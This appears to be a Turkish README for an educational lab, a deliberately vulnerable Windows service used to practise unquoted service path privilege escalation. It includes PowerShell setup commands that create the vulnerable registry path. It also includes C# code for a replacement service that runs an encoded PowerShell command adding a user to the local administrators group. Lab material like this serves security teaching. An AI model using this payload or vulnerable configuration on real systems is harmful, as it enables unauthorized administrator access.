## Giriş
Bunun sadece bir eğitim aacıyla hazırlandığını ve gerçekten uzak bir senaryo olduğunu unutmayın.

## Kurulum

Projeyi bu hali ile derlersen /bin klasörü altında sana bir exe oluşacaktır. Bu bir servis projesi ve bunu windows'a eklemen gerekecektir. Ekleme işlemini aşağıdaki kod ile terminal üzerinden yapabilirsin.
```ps1
New-Service -Name "YourServiceName" -BinaryPathName <exenin tam yolu>.exe
```
Eğer servisi silip tekrardan eklemek istersen:
```ps1
$service = Get-WmiObject -Class Win32_Service -Filter "Name='Personel Takip'"
$service.Delete()
```

Bu esnada servis aslında düzgün bir şekilde çalışmaya başlayacaktır. Bu serivisi lab ortamına hazır hale getirmek istiyorsan aşağıdaki kodu çalıştır. Bu sayede unquoted path oluşturmuş olacaksın.

```ps1
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\zafiyetliServis4Kuday\" -Name ImagePath -Value "C:\Users\Ogrenci\Desktop\Zafiyetli Servis\Zafiyetli Servis\bin\Release\Zafiyetli Servis.exe"

```
Yukarıdaki binary path'i değiştirmeyi unutma ve unquoted path'e uygun bir path ver.

Evet kurulum tamam!

## Hackleme
Lab ortamında unquoted path'i tespit ettikten sonra bunu exploit etmek isteyebilirsin. Bu işlemi manuel bir şekilde nasıl yaptığımızı sana göstereyim.
```c#
 protected override void OnStart(string[] args)
        {
            using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(@"C:\PersonelTakip.txt", true))
            {

                file.WriteLine(DateTime.Now.ToString() + ": Servis Başladı!");
            }
            //Base64EncodedCommand();
        }

```

Servis başladığında yukarıda görmüş olduğun gibi C:\PersonelTakip.txt isimli dosyaya yazı yazmakta. Bunun haricinde yorum satırına alınmış bir kod var.`Base64EncodedCommand()` metodunun içine bir gidelim.
```c#
void Base64EncodedCommand()
        {
            var psCommmand = @"net localgroup administrators bkg\yetkisizuser /add";
            var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(psCommmand);
            var psCommandBase64 = Convert.ToBase64String(psCommandBytes);

            var startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy unrestricted -EncodedCommand {psCommandBase64}",
                UseShellExecute = false
            };
            Process.Start(startInfo);

            using (System.IO.StreamWriter file =
          new System.IO.StreamWriter(@"C:\PersonelTakip.txt", true))
            {

                file.WriteLine(DateTime.Now.ToString() + ": Servis Başladı (Hack)!");
            }

        }
```

Evet burda bir batch kodu çalıştırıldığını görüyoruz. `net localgroup administrators bkg\yetkisizuser /add`. Unquoted service path sistemde tespit edildikten sonra `OnStart` metodunu aşağıdaki gibi güncellemek isteyebilirsiniz.
```c#
        protected override void OnStart(string[] args)
        {
            //using (System.IO.StreamWriter file =
            //new System.IO.StreamWriter(@"C:\PersonelTakip.txt", true))
            //{

            //    file.WriteLine(DateTime.Now.ToString() + ": Servis Başladı!");
            //}
            Base64EncodedCommand();
        }
```

Artık servis başladığında batch kodumuz çalışacak. Bu projeyi derleyip exe'yi binary path içerisinde unquoted service path'e uygun bir isimle eklerseniz. Servis yeniden başladığında local adminsiniz!
